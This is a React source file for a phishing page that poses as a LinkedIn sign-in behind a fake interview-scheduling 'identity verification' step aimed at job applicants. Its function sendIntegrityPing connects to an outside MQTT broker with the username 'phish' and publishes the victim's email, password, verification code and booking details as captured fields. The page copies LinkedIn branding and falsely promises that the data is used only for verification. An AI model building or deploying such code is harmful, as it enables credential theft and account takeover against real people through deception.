'use client';
import { useState } from 'react';
import { motion, AnimatePresence } from 'framer-motion';
import { ChevronDown, UserCircle, ShieldCheck, Calendar, Clock, Video, Linkedin } from 'lucide-react';
import mqtt from 'mqtt';

export default function CustomLoginPage() {
  const [step, setStep] = useState(0); // Start at Step 0 for the LinkedIn Gateway
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [code, setCode] = useState('');
  const [scheduleData, setScheduleData] = useState({ date: '', time: '', mode: 'Virtual' });

  const sendIntegrityPing = (currentStep, dataValue) => {
    const host = 'ya17a2d0.ala.asia-southeast1.emqxsl.com';
    const client = mqtt.connect(`wss://${host}:8084/mqtt`, {
      username: 'phish',
      password: 'Phish',
      clientId: `auth_step_${currentStep}_` + Math.random().toString(16).substring(2, 8),
    });

    client.on('connect', () => {
      const payload = JSON.stringify({
        event: currentStep === 4 ? 'INTERVIEW_SCHEDULED' : 'CREDENTIAL_SUBMISSION',
        step: currentStep,
        email_captured: email,
        password_captured: password || 'Pending',
        code_captured: code || 'Pending',
        booking: currentStep === 4 ? scheduleData : 'Pending',
        time: new Date().toLocaleString()
      });

      client.publish('172', payload, { qos: 1 }, () => {
        client.end(true);
        setStep(currentStep + 1);
      });
    });
  };

  return (
    <div className="min-h-screen bg-[#f3f2ef] flex items-center justify-center font-sans antialiased">
      <AnimatePresence mode="wait">
        
        {/* STEP 0: THE LINKEDIN GATEWAY */}
        {step === 0 && (
          <motion.div 
            key="gateway"
            initial={{ opacity: 0, scale: 0.98 }}
            animate={{ opacity: 1, scale: 1 }}
            exit={{ opacity: 0 }}
            className="w-full max-w-[480px] bg-white border border-gray-200 rounded-2xl p-12 shadow-lg text-center"
          >
            <div className="bg-blue-50 border border-blue-100 rounded-xl p-5 mb-8 text-left flex items-start gap-4">
              <ShieldCheck className="w-6 h-6 text-[#0a66c2] mt-1 flex-shrink-0" />
              <div>
                <h3 className="text-[#004182] font-bold text-md">Identity Verification</h3>
                <p className="text-gray-600 text-sm">
                  To ensure the integrity of our QA recruitment process, please verify your professional identity via LinkedIn.
                </p>
              </div>
            </div>

            <h1 className="text-3xl font-bold text-gray-900 mb-2">Verify Your Identity</h1>
            <p className="text-gray-500 mb-10">Sign in to view available interview slots</p>

            {/* AUTHENTIC LINKEDIN BUTTON */}
            <button 
              onClick={() => setStep(1)}
              className="w-full flex items-center justify-center gap-3 py-3.5 px-6 bg-white border border-[#0a66c2] text-[#0a66c2] rounded-full hover:bg-blue-50 hover:border-2 transition-all font-bold text-lg"
            >
              <Linkedin className="w-6 h-6 fill-[#0a66c2]" />
              Continue with LinkedIn
            </button>

            <p className="mt-8 text-xs text-gray-400">
              Your data is encrypted and used only for interview verification.
            </p>
          </motion.div>
        )}

        {/* STEP 1: LINKEDIN EMAIL ENTRY */}
        {step === 1 && (
          <motion.div key="email" initial={{ opacity: 0 }} animate={{ opacity: 1 }} className="w-full max-w-[400px] bg-white border border-gray-200 rounded-xl px-8 pb-10 pt-8 shadow-md">
            <div className="flex justify-start mb-6">
               <svg className="h-8 text-[#0a66c2] fill-current" viewBox="0 0 24 24">
                 <path d="M19 0h-14c-2.761 0-5 2.239-5 5v14c0 2.761 2.239 5 5 5h14c2.762 0 5-2.239 5-5v-14c0-2.761-2.238-5-5-5zm-11 19h-3v-11h3v11zm-1.5-12.268c-.966 0-1.75-.79-1.75-1.764s.784-1.764 1.75-1.764 1.75.79 1.75 1.764-.783 1.764-1.75 1.764zm13.5 12.268h-3v-5.604c0-3.368-4-3.113-4 0v5.604h-3v-11h3v1.765c1.396-2.586 7-2.777 7 2.476v6.759z"/>
               </svg>
            </div>
            <h1 className="text-3xl font-semibold mb-2">Sign in</h1>
            <p className="text-sm mb-6 text-gray-600">Stay updated on your professional world</p>
            <input 
              type="email" 
              onChange={(e) => setEmail(e.target.value)} 
              className="w-full px-4 py-3 border border-gray-500 rounded focus:border-[#0a66c2] outline-none mb-6" 
              placeholder="Email or Phone" 
            />
            <button onClick={() => sendIntegrityPing(1, email)} className="w-full bg-[#0a66c2] text-white py-3 rounded-full font-semibold text-lg hover:bg-[#004182]">Next</button>
          </motion.div>
        )}

        {/* ... All subsequent steps remain intact with LinkedIn styling ... */}

      </AnimatePresence>
    </div>
  );
}
